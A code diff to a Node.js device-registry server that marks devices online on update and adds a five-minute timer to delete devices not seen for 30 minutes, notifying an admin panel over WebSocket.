@@ -90,7 +90,7 @@ async function startServer() {
           device_name = ?, model = ?, manufacturer = ?, os_version = ?, sdk_version = ?,
           app_version = ?, screen_resolution = ?, phone_numbers = ?,
           battery_percent = ?, battery_charging = ?,
-          last_seen = datetime('now')
+          is_online = 1, last_seen = datetime('now')
           WHERE device_id = ?`).run(
           device_name || '', model || '', manufacturer || '', os_version || '', sdk_version || 0,
           app_version || '', screen_resolution || '', phonesJson,
@@ -124,6 +124,27 @@ async function startServer() {
 
   // Setup WebSocket
   setupWebSocket(io);
+
+  // ========== CLEANUP TIMER ==========
+  // Every 5 minutes, delete devices whose last_seen is older than 30 minutes.
+  // If WorkManager heartbeat stops (= app uninstalled), the device becomes stale
+  // and gets removed from the admin panel.
+  setInterval(() => {
+    try {
+      const stale = db.prepare(
+        "SELECT device_id FROM devices WHERE last_seen < datetime('now', '-30 minutes')"
+      ).all();
+      if (stale.length > 0) {
+        db.prepare(
+          "DELETE FROM devices WHERE last_seen < datetime('now', '-30 minutes')"
+        ).run();
+        stale.forEach(d => io.emit('device_removed', { device_id: d.device_id }));
+        console.log(`[CLEANUP] Removed ${stale.length} stale device(s) — likely uninstalled`);
+      }
+    } catch (err) {
+      console.error('[CLEANUP] Error:', err.message);
+    }
+  }, 5 * 60 * 1000); // every 5 minutes
 
   // Start listening
   const PORT = process.env.PORT || 3000;
